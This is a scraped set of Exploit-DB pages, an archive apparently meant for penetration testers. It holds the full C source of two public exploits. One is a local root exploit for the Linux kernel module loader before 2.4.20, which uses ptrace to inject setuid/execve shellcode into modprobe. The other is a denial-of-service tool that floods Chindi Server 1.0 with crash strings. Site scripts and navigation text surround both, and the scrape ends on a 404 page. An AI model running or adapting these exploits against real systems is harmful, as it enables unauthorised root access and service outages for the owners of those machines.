"=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 12
Linux Kernel < 2.4.20 - Module Loader Privilege Escalation - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDLinux Kernel < 2.4.20 - Module Loader Privilege EscalationEDB-ID:12CVE:2003-0127EDB Verified:Author:KuRaKType:localExploit:/Platform:LinuxDate:2003-04-14Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*************************************************       Linux Kernel Module Loader Local R00t Exploit*	              Up to 2.4.20*	        By anonymous KuRaK*************************************************#include <stdio.h>#include <stdlib.h>#include <signal.h>#include <fcntl.h>#include <errno.h>#include <unistd.h>#include <sys/types.h>#include <sys/stat.h>#include <sys/ptrace.h>#include <sys/wait.h>#include <sys/mman.h>#include <sys/time.h>#include <linux/user.h>#define TMPSIZE 4096#define FMAX 768#define UIDNUM 6#define MMSIZE (4096*1)#define MAXSTACK 0xc0000000//      where to put the root script#define SHELL "/tmp/w00w00w"//      what to open to run modprobe#define ENTRY "/dev/dsp3"struct uids {unsigned uid;unsigned euid;unsigned suid;unsigned fsuid;};//      thanks to the epcs2.c code :-))char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90" "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"	/* setuid(0) */"\x31\xc0\xb0\x2e\xcd\x80" "\x31\xc0\x50\xeb\x17\x8b\x1c\x24"/* execve(SHELL) */"\x90\x90\x90\x89\xe1\x8d\x54\x24"	/* lets be tricky */"\x04\xb0\x0b\xcd\x80\x31\xc0\x89""\xc3\x40\xcd\x80\xe8\xe4\xff\xff" "\xff" SHELL "\x00\x00\x00\x00";//      payload...char *shellcmd = "#!/bin/sh\nid|wall\necho \"Your kernel is buggy\"|wall";volatile int sig = 0;volatile struct user_regs_struct regs;void sighnd(int v){sig++;}void fatal(const char *msg){printf("\n");if (!errno) {fprintf(stderr, "FATAL ERROR: %s\n", msg);} else {perror(msg);}printf("\n");fflush(stdout);fflush(stderr);exit(129);}void exploit(int pid){int i;if (ptrace(PTRACE_GETREGS, pid, 0, &regs))fatal("ptrace: PTRACE_GETREGS");for (i = 0; i <= sizeof(shellcode); i += 4) {if (ptrace(PTRACE_POKETEXT, pid, regs.eip + i, *(int *) (shellcode + i)))fatal("ptrace: PTRACE_POKETEXT");}if (ptrace(PTRACE_SETREGS, pid, 0, &regs))fatal("ptrace: PTRACE_SETREGS");ptrace(PTRACE_DETACH, pid, 0, 0);kill(pid, SIGCONT);}int get_ids(FILE * fp, struct uids *uids){int i;char tmp[TMPSIZE];fseek(fp, 0, SEEK_SET);for (i = 0; i < UIDNUM; i++)fgets(tmp, sizeof(tmp), fp);return fscanf(fp, "Uid: %u %u %u %u", &uids->uid, &uids->euid,&uids->suid, &uids->fsuid);}int main(int ac, char **av){int fd, pid, p, i;char buf[TMPSIZE];struct uids uids;FILE *fp;setpgrp();setsid();umask(022);unlink(SHELL);fd = open(SHELL, O_RDWR | O_CREAT | O_TRUNC, 0755);fp = fdopen(fd, "w+");fprintf(fp, "%s\n", shellcmd);fclose(fp);pid = getpid() + 2;snprintf(buf, sizeof(buf) - 1, "/proc/%d/status", pid);printf("\nModprobe pid %d, my pid %d", pid, getpid());fflush(stdout);signal(SIGUSR1, sighnd);//      fork modprobe helperif (!(p = fork())) {//      some nice work for exec_usermodehelper(), keep it busy!for (i = 0; i < FMAX; i++) {fd = open("/dev/zero", O_RDWR);mmap(NULL, MMSIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);}kill(getppid(), SIGUSR1);while (!sig);printf("\nHelper (pid %d) requesting module...", getpid());fflush(stdout);fd = open(ENTRY, O_RDONLY | O_NONBLOCK);exit(0);}//      synchronize with the childelse {while (!sig);kill(p, SIGUSR1);//      wait for modprobe to run at unprivileged levelwhile (1) {fd = open(buf, O_RDONLY);if (fd > 0) {if (!(fp = fdopen(fd, "r")))fatal("fdopen");if (get_ids(fp, &uids) != 4|| (uids.uid != uids.euid || uids.uid != uids.suid|| uids.uid != uids.fsuid)) {fatal("did not catch modprobe...try again later :-)");}//      ok, it runs...while (1) {if (ptrace(PTRACE_ATTACH, pid, NULL, NULL)) {fatal("PTRACE_ATTACH failed!");} else {i = 0;printf("\nAttached afterburner...\n");fflush(stdout);while (ptrace(PTRACE_GETREGS, pid, 0, &regs)|| !regs.eip || regs.eip >= MAXSTACK) {ptrace(PTRACE_SYSCALL, pid, NULL, NULL);printf("\rplease wait %d", i++);fflush(stdout);}waitpid(pid, NULL, WUNTRACED);printf("\nValid EIP found EIP=%p\nexploiting the bug, good luck... ",regs.eip);fflush(stdout);exploit(pid);exit(0);}}fclose(fp);}}}return 0;}// milw0rm.com [2003-04-14]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 13
Chindi Server 1.0 - Denial of Service - Windows dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDChindi Server 1.0 - Denial of ServiceEDB-ID:13CVE:EDB Verified:Author:Luca ErcoliType:dosExploit:/Platform:WindowsDate:2003-04-18Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/**************************************************** Chindi server 1.0  Denial of Service* Proof of Concept by Luca Ercoli  luca.ercoli at inwind.it* After DoS, server appears to be up, but will not allow* new connections.****************************************************#include#include#include#include#include#define PORT    4444#define DOS     "crash"int main(int argc, char *argv[]){int nOpt,count,sockfd;struct hostent *he;struct sockaddr_in server_addr;char *host;printf ("\nChindi server 1.0 remote DoS\n\n");if(argc < 2 ) {printf ("Usage: %s -t target\n",argv[0]);exit(0);}while((nOpt = getopt(argc, argv, "t")) != -1) {switch(nOpt) {case 't':host = optarg;break;default:exit(0);}}if ((he = gethostbyname(argv[2])) == NULL){herror("gethostbyname");exit(1);}server_addr.sin_family = AF_INET;server_addr.sin_port = htons(PORT);server_addr.sin_addr = *((struct in_addr *) he->h_addr);sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);if (connect (sockfd, (struct sockaddr *) &server_addr,sizeof(structsockaddr)) == -1){perror("Connect");exit(1);}printf("1. Connected\n");sleep(1);printf("2. Sending crash string\n");sleep(1);printf("3. Verifing server status: ");sleep(1);for (count=0; count<9999; count++) send(sockfd,DOS,strlen(DOS),0);close(sockfd);// milw0rm.com [2003-04-18]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 14
404 Page Not Found | Exploit Database#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIED404Page Not FoundThe page you are looking for could not be found.HomeGHDBPapersShellcodesExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} 